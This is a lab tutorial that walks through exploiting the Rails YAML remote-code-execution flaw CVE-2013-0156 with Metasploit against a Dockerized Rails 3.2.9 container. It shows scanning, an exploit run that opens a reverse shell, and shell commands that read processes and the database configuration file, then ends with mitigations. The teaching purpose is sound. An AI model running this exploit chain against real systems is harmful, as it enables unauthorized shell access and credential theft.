## Rails Remote Code Execution

### Background

Ruby on Rails is a popular web development framework written in Ruby. Rails revolutionized web development several years ago and is still widely used. Unfortunately, this makes it the target of exploits like the one will demonstrate today.

Rails is very versatile and can send and receive documents through a variety of formats, including HTML, XML, JSON, and even YAML. However, this flexibility comes at a price. Many versions of Rails before 3.2.11 have a bug where specially crafted YAML requests can trick the server into instantiating arbitrary Ruby objects.

Instantiating objects may not seem like a huge security hole. But if the application includes the DRb (distributed Ruby) module, then an attacker can start a DRb server that will allow them to execute arbitrary commands on the compromised host. In short, an attacker could gain full shell access to a vulnerable host with a simple YAML request over HTTP.

You can learn more about this vulnerability here: [CVE-2013-0156]

### Setup

To demonstrate this vulnerability, we will use the Penkit CLI and catalog to run Rails and Metasploit on a virtual network inside of Docker. First, we need to start a new Rails 3.2.9 container.

```bash
$ penkit start rails:3.2.9
Starting container rails
bc413ea19c1fdc17425636e63d0a270983959b9e87c7481f202aa6f68f99e338
```

You can verify that the container was started using the process list.

```bash
$ penkit ps
```

Then hit it with the curl utility to test the application over HTTP.

```bash
$ penkit curl rails:8080
```

Now we can fire up our exploit tool of choice, Metasploit.

```bash
$ penkit metasploit
```

### Discovery

After starting Metasploit, we are presented with an `msfconsole` prompt. You may also notice that Metasploit is running in a Docker container. Use `ifconfig` to verify that Metasploit is connected to the Penkit virtual network.

```bash
msf > ifconfig eth0
[*] exec: ifconfig eth0

eth0      Link encap:Ethernet  HWaddr 02:42:AC:14:00:03
          inet addr:172.20.0.3  Bcast:0.0.0.0  Mask:255.255.0.0
          inet6 addr: fe80::42:acff:fe14:3/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:22 errors:0 dropped:0 overruns:0 frame:0
          TX packets:8 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:2634 (2.5 KiB)  TX bytes:648 (648.0 B)
```

And we can `ping` our Rails 3.2.9 container using its DNS alias `rails`.

```bash
msf > ping -c 4 rails
[*] exec: ping -c 4 rails

PING rails (172.18.0.2): 56 data bytes
64 bytes from 172.18.0.2: seq=0 ttl=64 time=0.056 ms
64 bytes from 172.18.0.2: seq=1 ttl=64 time=0.111 ms
64 bytes from 172.18.0.2: seq=2 ttl=64 time=0.143 ms
64 bytes from 172.18.0.2: seq=3 ttl=64 time=0.102 ms

--- rails ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max = 0.056/0.103/0.143 ms
```

Now we can try a direct port scan to find out that Rails is running on port `8080`.

```bash
msf > nmap rails
[*] exec: nmap rails

Starting Nmap 7.40 ( https://nmap.org ) at 2017-03-10 20:45 UTC
Nmap scan report for rails (172.18.0.2)
Host is up (0.000017s latency).
rDNS record for 172.18.0.2: rails.penkit
Not shown: 999 closed ports
PORT     STATE SERVICE
8080/tcp open  http-proxy
MAC Address: 02:42:AC:12:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.82 seconds
```

Since we know which vulnerability we are looking for, we can use the `auxiliary/scanner/http/rails_xml_yaml_scanner` module from Metasploit to confirm that there is a security hole in our `rails` container.

First, we need to activate the module and see what options it has.

```bash
msf > use auxiliary/scanner/http/rails_xml_yaml_scanner

msf auxiliary(rails_xml_yaml_scanner) > options

Module options (auxiliary/scanner/http/rails_xml_yaml_scanner):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   HTTP_METHOD  POST             yes       HTTP Method (Accepted: GET, POST, PUT)
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target address range or CIDR identifier
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   THREADS      1                yes       The number of concurrent threads
   URIPATH      /                yes       The URI to test
   VHOST                         no        HTTP server virtual host
```

Then `set` the `RHOSTS` and `RPORT` options.

```bash
msf auxiliary(rails_xml_yaml_scanner) > set RHOSTS rails
RHOSTS => rails

msf auxiliary(rails_xml_yaml_scanner) > set RPORT 8080
RPORT => 8080
```

Now we are ready to `run` the vulnerability scanner.

```bash
msf auxiliary(rails_xml_yaml_scanner) > run

[+] 172.18.0.2:8080 is likely vulnerable due to a 500 reply for invalid YAML
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Our output indicates that the host is likely vulnerable to [CVE-2013-0156]. The scanner was able to produce a 500 response simply by sending an invalid YAML request. Let's `back` out of the scanner module and move on to the exploit.

```bash
msf auxiliary(rails_xml_yaml_scanner) > back
msf >
```

### Exploit

For the exploit, we will use another Metasploit module: `exploit/multi/http/rails_xml_yaml_code_exec`. This module attempts to create and connect to a `DRb` server using a specially crafted YAML request. If it is successful, we will be given a shell directly into the Rails host.

If you are still in `msfconsole`, start by activating the module and viewing its options.

```bash
msf > use exploit/multi/http/rails_xml_yaml_code_exec

msf exploit(rails_xml_yaml_code_exec) > options

Module options (exploit/multi/http/rails_xml_yaml_code_exec):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   HTTP_METHOD  POST             yes       HTTP Method (Accepted: GET, POST, PUT)
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                         yes       The target address
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   URIPATH      /                yes       The path to a vulnerable Ruby on Rails application
   VHOST                         no        HTTP server virtual host
```

We only care about the `RHOST` and `RPORT` options, so let's set them.

```bash
msf exploit(rails_xml_yaml_code_exec) > set RHOST rails
RHOST => rails

msf exploit(rails_xml_yaml_code_exec) > set RPORT 8080
RPORT => 8080
```

Now `run` the exploit.

```bash
msf exploit(rails_xml_yaml_code_exec) > run

[*] Started reverse TCP handler on 172.18.0.3:4444
[*] Sending Railsv2 request to rails:8080...
[*] Sending Railsv3 request to rails:8080...
[*] Command shell session 1 opened (172.18.0.3:4444 -> 172.18.0.2:54832) at 2017-03-10 20:57:28 +0000
```

At first glance, nothing happened. But if you start typing like you are in a shell, you will get a response from the compromised Rails container.

```bash
hostname
rails

whoami
ruby
```

As you can see, we are definitely running commands on the Rails container. The exploit module is remotely passing commands to DRb, which is using Ruby system calls to run them on the host. You can verify further by checking the IP address of the compromised host.

```bash
ifconfig eth0

eth0      Link encap:Ethernet  HWaddr 02:42:AC:12:00:02
inet addr:172.18.0.2  Bcast:0.0.0.0  Mask:255.255.0.0
inet6 addr: fe80::42:acff:fe12:2/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:12044 errors:0 dropped:0 overruns:0 frame:0
TX packets:2205 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:667072 (651.4 KiB)  TX bytes:140575 (137.2 KiB)
```

This is not quite as great as a full, interactive shell; but it is pretty good! We can easily explore the filesystem...

```bash
pwd
/opt/ruby

ls /
bin
dev
etc
home
...
```

Or system processes...

```bash
$ ps aux
ps aux
PID   USER     TIME   COMMAND
1 root       0:00 /sbin/tini -- su-exec ruby bundle exec rails s --port 8080 -b 0.0.0.0
8 ruby       0:02 /usr/bin/ruby script/rails s --port 8080 -b 0.0.0.0
17 ruby       0:00 /usr/bin/ruby script/rails s --port 8080 -b 0.0.0.0
48 ruby       0:00 ps aux
```

Or even database configuration...

```bash
cat config/database.yml
```

When you are done exploring, you can close the shell session by pressing `Ctrl+C`.

```bash
^C
Abort session 1? [y/N]  y

[*] 172.18.0.2 - Command shell session 1 closed.  Reason: User exit
```

Then exit Metasploit.

```bash
msf exploit(rails_xml_yaml_code_exec) > exit
```

And finally, clean up `rails` and any other Penkit containers.

```bash
$ penkit rm
Are you sure you want to remove 1 container? [y/N] y
5cfbfc643f1c
```

### Summary

[CVE-2013-0156] can be very nasty. If the target server has no port restrictions, then vulnerable Rails configurations could allow shell access through a simple YAML request.

You can mitigate this risk by:

- Upgrading Rails to version 3.2.11+
- Not including the `drb` module in your Rails applications

[CVE-2013-0156]: http://www.cvedetails.com/google-search-results.php?q=2013-0156